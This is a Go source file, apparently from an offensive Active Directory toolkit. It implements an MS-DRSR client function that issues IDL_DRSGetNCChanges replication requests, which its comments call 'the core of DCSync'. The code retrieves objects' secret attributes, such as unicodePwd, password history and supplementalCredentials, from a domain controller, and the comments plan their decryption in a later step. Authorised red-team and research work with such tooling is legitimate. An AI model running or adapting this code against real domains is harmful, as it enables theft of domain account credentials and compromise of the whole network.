package msdrsr

import (
	"fmt"
	"unicode/utf16"

	"github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/e3514235-4b06-11d1-ab04-00c04fc2dcd2/4.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	drsrtypes "github.com/TheManticoreProject/Manticore/windows/protocols/ms-drsr"
)

// ReplicatedAttribute is one attribute of a replicated object: its ATTRTYP (an OID
// compressed against the reply's prefix table) and its raw value(s). Secret attributes
// (unicodePwd, ntPwdHistory, supplementalCredentials, …) are returned still encrypted;
// decryption with the session key and PEK is Phase 4.
type ReplicatedAttribute struct {
	AttrType uint32
	Values   [][]byte
}

// ReplicatedObject is one object returned by IDL_DRSGetNCChanges: its identity (GUID and,
// when present, distinguished name) and its attributes (values still encrypted).
type ReplicatedObject struct {
	GUID       guid.GUID
	DN         string
	Attributes []ReplicatedAttribute
}

// ReplicationResult holds the objects from a GetNCChanges reply plus the context a later
// decryption pass needs: the source prefix table (to map each ATTRTYP to its OID) and the
// raw V6 reply (which carries the PEK list and uptodate vectors).
type ReplicationResult struct {
	Objects     []ReplicatedObject
	PrefixTable drsrtypes.SCHEMA_PREFIX_TABLE
	Reply       *drsrtypes.DRS_MSG_GETCHGREPLY_V6
}

// ReplicateSingleObject replicates exactly one object, identified by its objectGUID, via
// IDL_DRSGetNCChanges (opnum 3) with the EXOP_REPL_OBJ extended operation — the core of
// DCSync. It issues a V8 request and expects the V6 reply negotiated at bind. Attribute
// values are returned as received (secrets remain encrypted).
//
// uuidDsaObjDest/uuidInvocIdSrc are left as the NULL GUID: for EXOP_REPL_OBJ the server
// does not require the caller's source-DSA GUID. (Full-NC replication and strict servers
// want the real source DSA GUID from IDL_DRSDomainControllerInfo; that is a later step.)
func (c *Client) ReplicateSingleObject(objectGUID guid.GUID) (*ReplicationResult, error) {
	if !c.bound {
		return nil, fmt.Errorf("msdrsr: not connected")
	}

	pnc := drsrtypes.NewDSNameFromGUID(objectGUID)
	msgIn := drsrtypes.DRS_MSG_GETCHGREQ{
		Tag: 8,
		V8: drsrtypes.DRS_MSG_GETCHGREQ_V8{
			UuidDsaObjDest: c.sourceDSA, // NULL unless SetSourceDSA was called
			UuidInvocIdSrc: c.sourceDSA,
			PNC:            &pnc,
			UlFlags:        ndr.DWORD(drsrtypes.DRS_INIT_SYNC | drsrtypes.DRS_WRIT_REP),
			CMaxObjects:    1,
			CMaxBytes:      0,
			UlExtendedOp:   ndr.DWORD(drsrtypes.EXOP_REPL_OBJ),
		},
	}

	outVersion, msgOut, err := functions.IDL_DRSGetNCChanges(c.rpc, c.handle, 8, msgIn)
	if err != nil {
		return nil, fmt.Errorf("msdrsr: ReplicateSingleObject: %w", err)
	}
	if uint32(outVersion) != 6 {
		return nil, fmt.Errorf("msdrsr: ReplicateSingleObject: server replied version %d, expected 6 (GETCHGREPLY_V6)", outVersion)
	}

	reply := msgOut.V6
	result := &ReplicationResult{PrefixTable: reply.PrefixTableSrc, Reply: &reply}
	for node := reply.PObjects; node != nil; node = node.PNextEntInf {
		result.Objects = append(result.Objects, projectEntInf(node.Entinf))
	}
	return result, nil
}

// projectEntInf converts a wire ENTINF into a friendly ReplicatedObject.
func projectEntInf(e drsrtypes.ENTINF) ReplicatedObject {
	var obj ReplicatedObject
	if e.PName != nil {
		obj.GUID = e.PName.Guid.GUID()
		obj.DN = decodeWChars(e.PName.StringName)
	}
	for _, attr := range e.AttrBlock.PAttr {
		ra := ReplicatedAttribute{AttrType: uint32(attr.AttrTyp)}
		for _, v := range attr.AttrVal.PAVal {
			ra.Values = append(ra.Values, append([]byte(nil), v.PVal...))
		}
		obj.Attributes = append(obj.Attributes, ra)
	}
	return obj
}

// decodeWChars converts a NUL-terminated UTF-16 code-unit slice (DSNAME.StringName) to a
// Go string, dropping the terminator.
func decodeWChars(units []uint16) string {
	for i, u := range units {
		if u == 0 {
			units = units[:i]
			break
		}
	}
	if len(units) == 0 {
		return ""
	}
	return string(utf16.Decode(units))
}
